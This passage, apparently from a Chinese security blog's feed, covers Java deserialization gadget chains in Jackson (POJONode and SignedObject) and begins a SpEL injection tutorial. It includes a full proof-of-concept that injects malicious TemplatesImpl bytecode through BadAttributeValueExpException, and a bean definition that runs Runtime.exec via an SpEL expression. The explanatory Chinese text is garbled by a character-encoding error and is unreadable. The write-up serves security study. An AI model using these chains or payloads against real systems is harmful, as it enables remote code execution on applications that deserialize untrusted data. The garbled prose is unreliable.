class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="POJONodeé“¾"><a href="#POJONodeé“¾" class="headerlink" title="POJONodeé“¾"></a>POJONodeé“¾</h3><p>å…¥å£ç‚¹ä½äºcom.fasterxml.jackson.databind.nodeä¸‹POJONode.toString</p><p>å®é™…ä¸Šè°ƒç”¨çš„æ˜¯çˆ¶ç±»BaseJsonNode.toString</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153045970.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153045970.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>nodeToStringè°ƒç”¨åˆ°writeValueAsStringï¼Œä¼šè§¦å‘getter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153105858.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153105858.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒObjectOutputStream.writeObject0ä¼šåˆ¤æ–­ç±»æ˜¯å¦é‡å†™äº†writeReplaceæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153445716.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153445716.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153454999.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153454999.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>BaseJsonNodeé‡å†™äº†writeReplaceæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153549511.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153549511.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶å‘ç”Ÿäº†å¼‚å¸¸ï¼ŒæŠŠè¿™ä¸ªæ–¹æ³•åˆ äº†å¯ä»¥é¡ºåˆ©åºåˆ—åŒ–</p><p>åºåˆ—åŒ–å½“ç„¶ä¸ä¼šå½±å“ååºåˆ—åŒ–çš„è¿›ç¨‹ï¼Œç›´æ¥é‡å†™</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014155725144.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014155725144.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject -&gt;</span><br><span class="line">    POJONode.toString -&gt;</span><br><span class="line">    InternalNodeMapper,nodeToString -&gt;</span><br><span class="line">    JSONMapper.writeValueAsString -&gt; getter</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POJONode_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesClass);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, pojoNode);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SignedObjecté“¾"><a href="#SignedObjecté“¾" class="headerlink" title="SignedObjecté“¾"></a>SignedObjecté“¾</h3><p>æ‰“äºŒæ¬¡ååºåˆ—åŒ–ï¼Œç”¨äºç»•è¿‡è‡ªå®šä¹‰äº†POJONodeå¯¹å…¥å£ç±»çš„ç­›æŸ¥ï¼Œå¾ªç¯åµŒå¥—è¿‡æ»¤çš„ä¸èƒ½ç»•è¿‡</p><p>SignedObject.getObjectèƒ½ååºåˆ—åŒ–this.contentï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214004303.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214004303.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>contentèƒ½åœ¨æ„é€ å‡½æ•°èµ‹å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214038344.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214038344.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>SignedObjectè£…é…æ¶æ„ç±»ï¼Œç„¶åæ‰¾èƒ½è§¦å‘getterçš„åœ°æ–¹</p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject -&gt;</span><br><span class="line">    POJONode.toString -&gt;</span><br><span class="line">    InternalNodeMapper,nodeToString -&gt;</span><br><span class="line">    JSONMapper.writeValueAsString -&gt; </span><br><span class="line">    SignedObject.getObject -&gt;</span><br><span class="line">    BadAttributeValueExpException.readObject -&gt;</span><br><span class="line">    POJONode.toString -&gt;</span><br><span class="line">    InternalNodeMapper,nodeToString -&gt;</span><br><span class="line">    JSONMapper.writeValueAsString -&gt; </span><br><span class="line">    TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr=iQGkDRQDcWLmxY5q4Qox#toc-26">https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr%3DiQGkDRQDcWLmxY5q4Qox#toc-26</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jackson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spELè¡¨è¾¾å¼æ³¨å…¥</title>
      <link href="/2024/10/14/spel-biao-da-shi-zhu-ru/"/>
      <url>/2024/10/14/spel-biao-da-shi-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>å­¦C3P0ä¸ä¼šjacksonï¼Œç„¶åæ»šå»å­¦jacksonäº†</p><p>å­¦jacksonä¸ä¼šspELï¼Œç„¶åæ»šå»å­¦spELäº†</p><p>å­¦SpELä¸ä¼šspringï¼Œç„¶åæ»šæ¥å­¦springäº†</p><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><p>springæä¾›äº†å¾ˆå¤šç§ä»xmlæ–‡ä»¶å®ä¾‹åŒ–beançš„æ–¹æ³•ã€‚è™½ç„¶è¿™åªæ˜¯springçš„ä¸€å°éƒ¨åˆ†åŠŸèƒ½ï¼Œä½†è¿™æ˜¯å­¦javaå®‰å…¨çš„ä¸€å¤§éƒ¨åˆ†äº†ï¼ˆhh</p><p>xmlçš„æ¨¡æ¿å¦‚ä¸‹ï¼Œæ¯ä¸ªxmlè‡³å°‘éƒ½ä¼šåŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼Œç®—æ˜¯ä¸ªè§„èŒƒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">...</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„è§5tooc3a blog springRe0ï¼š</p><p><a href="https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#">https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#</a></p><p>å†™çš„éå¸¸å¥½ï¼Œå¥½çš„æˆ‘æŒ‘ä¸å‡ºå“ªé‡Œéœ€è¦é‡å†™ï¼Œä¸ºé˜²æ­¢ç½‘ç«™æŒ‚æ‰ï¼Œè½¬è½½åˆ°blogäº†</p><h2 id="SeELç®€ä»‹"><a href="#SeELç®€ä»‹" class="headerlink" title="SeELç®€ä»‹"></a>SeELç®€ä»‹</h2><p>åœ¨ spring3 ä¸­å¼•å…¥äº† spring è¡¨è¾¾å¼è¯­è¨€(Spring Expression Language)</p><p>ä¸»è¦ä½œç”¨æ˜¯å¯¹äºåŸºäº XML æ–‡ä»¶æˆ–è€…åŸºäºæ³¨è§£çš„ Spring é…ç½®çš„è£…è½½ã€‚ä¹Ÿå°±æ˜¯å¯¹IOCå®¹å™¨ä¸­çš„javaBeanè¿›è¡ŒåŠ¨æ€å±æ€§çŠ¶æ€å’Œæå–ã€‚</p><p>SpELè¡¨è¾¾å¼å®šç•Œç¬¦ä¸º<code>#&#123;&#125;</code>ï¼ŒåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶è¿˜èƒ½ç”¨<code>$&#123;&#125;</code></p><p>pom.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·èƒ½çœ‹ï¼š</p><p><a href="https://www.yuque.com/5tooc3a/jas/tgmsxhgzn4a615sx#">https://www.yuque.com/5tooc3a/jas/tgmsxhgzn4a615sx#</a></p><p>spELè§£ææ‰€éœ€çš„ä¾èµ–ä¸ºspring-expressionåŒ…</p><h3 id="xmlæ–‡æ¡£æ³¨å…¥"><a href="#xmlæ–‡æ¡£æ³¨å…¥" class="headerlink" title="xmlæ–‡æ¡£æ³¨å…¥"></a>xmlæ–‡æ¡£æ³¨å…¥</h3><p>springæœ€åŸºç¡€çš„è§£æxmlï¼Œå¯ä»¥ç”¨<code>#&#123;&#125;</code>è¡¨è¾¾å¼æ­é…<code>T()</code>ä½¿ç”¨å…¶ä»–ç±»çš„é™æ€æ–¹æ³•</p><p><code>T()</code>èƒ½è·å–åˆ°åŸºç¡€ç±»ï¼ˆå¹¶ä¸èƒ½å®ä¾‹åŒ–ï¼‰ï¼Œä¹‹åå°±å¯ä»¥è°ƒç”¨è¯¥ç±»çš„é™æ€æ–¹æ³•</p><p>Personç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚<code>Runtime.getRuntime().exec</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;Person&quot;</span> class=<span class="string">&quot;org.exploit.othercase.SpEL.Person&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span> /&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;age&quot;</span> value=<span class="string">&quot;#&#123;1&#125;&quot;</span> /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>beans.xmlæ”¾åˆ°resourcesä¸‹ï¼Œåˆ©ç”¨ClassPathXmlApplicationContextåŠ è½½xmlæ–‡æ¡£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpELcase</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ApplicationContext applicationContext=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        Person person=applicationContext.getBean(<span class="string">&quot;person&quot;</span>,Person.class);</span><br><span class="line">        person.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>singletonæ¨¡å¼ä¸‹ï¼ŒSpringåŠ è½½beanå¹¶è°ƒç”¨setterè¿›è¡Œä¾èµ–æ³¨å…¥çš„è¡Œä¸ºå‘ç”Ÿåœ¨ClassPathXmlApplicationContextåŠ è½½XMLé…ç½®æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œå…·ä½“æ¥è¯´ï¼š</p><ul><li>åŠ è½½é…ç½®æ–‡ä»¶é˜¶æ®µï¼š<br>å½“ä½¿ç”¨ClassPathXmlApplicationContextç±»æ¥åŠ è½½ä¸€ä¸ªæˆ–å¤šä¸ªXMLé…ç½®æ–‡ä»¶æ—¶ï¼ŒSpringä¼šè§£æè¿™äº›é…ç½®æ–‡ä»¶ä¸­çš„beanå®šä¹‰ï¼Œå¹¶å°†å®ƒä»¬æ³¨å†Œåˆ°IoCå®¹å™¨ä¸­ã€‚</li><li>beanå®ä¾‹åŒ–ä¸ä¾èµ–æ³¨å…¥ï¼š<br>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¯¹äºæ¯ä¸ªbeanï¼ŒSpringä¼šæ ¹æ®XMLä¸­å®šä¹‰çš„ä¿¡æ¯åˆ›å»ºbeançš„å®ä¾‹ã€‚<br>å¦‚æœbeanå®šä¹‰ä¸­åŒ…å«äº†å±æ€§åŠå…¶setteræ–¹æ³•ï¼Œåˆ™Springä¼šè°ƒç”¨è¿™äº›setteræ–¹æ³•æ¥å®Œæˆä¾èµ–æ³¨å…¥ã€‚</li><li>getBeanæ–¹æ³•ï¼š<br>å½“é€šè¿‡getBeanæ–¹æ³•ä»åº”ç”¨ä¸Šä¸‹æ–‡ä¸­è¯·æ±‚æŸä¸ªbeanæ—¶ï¼ŒSpringå®é™…ä¸Šæ˜¯ä»å·²ç»åˆå§‹åŒ–å¥½çš„beanæ± ä¸­è·å–è¯¥beançš„å¼•ç”¨ã€‚<br>æ­¤æ—¶ï¼Œbeançš„å®ä¾‹åŒ–å’Œä¾èµ–æ³¨å…¥å·¥ä½œå·²ç»å®Œæˆã€‚</li></ul><p>è°ƒç”¨getBeanåªæ˜¯ä»å®¹å™¨ä¸­è·å–å·²ç»å‡†å¤‡å¥½çš„beanå®ä¾‹ã€‚</p><p>singletonå’Œprototypeæ¨¡å¼çš„åŒºåˆ«ï¼š</p><p>å¯¹äºsingletonä½œç”¨åŸŸçš„beanï¼ŒSpringä¼šåœ¨å¯åŠ¨æ—¶åˆ›å»ºä¸€ä¸ªå•ä¾‹å®ä¾‹ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨å®¹å™¨ä¸­ã€‚<br>å¯¹äºprototypeä½œç”¨åŸŸçš„beanï¼ŒSpringä¸ä¼šåœ¨å¯åŠ¨æ—¶åˆ›å»ºå®ä¾‹ï¼Œè€Œæ˜¯åœ¨æ¯æ¬¡è°ƒç”¨getBeanæ–¹æ³•æ—¶åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹ã€‚</p><h3 id="SpelExpressionParser-æ³¨å…¥"><a href="#SpelExpressionParser-æ³¨å…¥" class="headerlink" title="SpelExpressionParser æ³¨å…¥"></a>SpelExpressionParser æ³¨å…¥</h3><p>SpelExpressionParser.parseExpressionè¿›è¡ŒSpelè§£æï¼Œç›´æ¥æ³¨ï¼Œæ— éœ€<code>#&#123;&#125;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span 